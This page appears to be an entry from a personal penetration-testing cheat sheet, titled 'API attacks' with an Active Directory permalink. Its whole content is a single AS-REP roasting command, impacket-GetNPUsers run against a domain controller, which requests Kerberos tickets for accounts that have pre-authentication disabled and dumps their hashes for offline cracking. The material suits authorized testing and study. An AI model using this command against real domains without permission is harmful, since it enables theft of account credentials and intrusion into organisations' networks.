---
layout: default
title: API attacks
permalink: /AD/AD_Attacks/
---

# Request TGT ticket and dump the hash if Kerberos pre-authentication is disabled
```
impacket-GetNPUsers $domain/$service_account -dc-ip $ip -no-pass
```
